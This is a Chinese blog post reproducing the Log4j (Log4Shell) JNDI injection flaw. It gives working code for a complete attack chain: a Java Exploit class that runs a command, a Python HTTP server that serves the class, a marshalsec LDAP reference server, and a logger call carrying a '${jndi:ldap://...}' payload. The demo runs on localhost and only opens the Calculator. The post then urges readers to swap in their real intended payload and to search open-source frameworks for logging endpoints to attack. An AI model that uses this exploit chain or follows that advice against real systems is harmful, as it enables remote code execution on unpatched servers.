---
title: 前段时间的Log4J漏洞复现
tags: 信息安全
categories: 信息安全
description: 如何使用正确的方式复现Log4j漏洞，利用Log4j漏洞进行攻击
keywords: 'Log4j漏洞,漏洞,攻击,Apache漏洞,Log4j,网络安全,网络攻击'
abbrlink: 659dfd84
date: 2021-12-24 17:12:02
---
Log4j这个漏洞的原理其实非常简单，就是logger在执行日志的时候，如果中间有表达式，就会被执行，如果这个表达式是JNDI就会去远程下载文件到本地执行，复现方式非常简单：

先写一个类：
```
public class Exploit {
    public Exploit(){
        try{
            String[] commands = {"open", "/System/Applications/Calculator.app"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Exploit e = new Exploit();
    }
}
```

这个类的作用是调用本地的计算器，直接运行也会弹出计算器的调用结果，把这个Java编译成Class，在这个class的目录执行：
```
 python3 -m http.server 8100     
```
会利用python启动一个http服务，开启在8100端口，这个服务的作用是下载这个class，你直接访问这个地址也能直接下载这个文件。

接着开启一个LDAP服务，利用JDNI反射的方式去调用LDAP，怎么开启LDAP服务呢，不想那么麻烦直接使用一个Java工具即可：
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8100/#Exploit"
```
启动后会有如下输出：
```
Listening on 0.0.0.0:1389
Send LDAP reference result for Log4jTest redirecting to http://127.0.0.1:8100/Exploit.class
Send LDAP reference result for Log4jTest redirecting to http://127.0.0.1:8100/Exploit.class
```

有了上面步骤，攻击的环境已经准备好了，只需要寻找目标，自己写一个目标：

```
package com.fcbai.log4j.example;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
public class Log4jExample {
    private static final Logger logger = LogManager.getLogger(Log4jExample.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("params:{}","${jndi:ldap://127.0.0.1:1389/Exploit}");
    }
}

```

运行上面的代码，会直接弹出计算器的框，有了这个case，那要攻击就方便多了，两个步骤：

1. Exploit的代码写成你自己真正想干的事，而不是调用一个计算。
2. 寻找服务器可能的API，也就是哪些API可能会输出Log，这样你可以在很多开源框架里面到处找，就能找到一大波开源框架漏洞，反是用了这个框架的，你就可以选择`合适`的方式去发起请求。

如此而已。

两个附件下载：
[点击下载](marshalsec-0.0.3-SNAPSHOT-all.jar "marshalsec-0.0.3-SNAPSHOT-all.jar")
[点击下载](log4j-bug-reproduction.tar.gz "log4j-bug-reproduction.tar.gz")

具体的代码请看：https://github.com/baifachuan/log4j-bug-reproduction
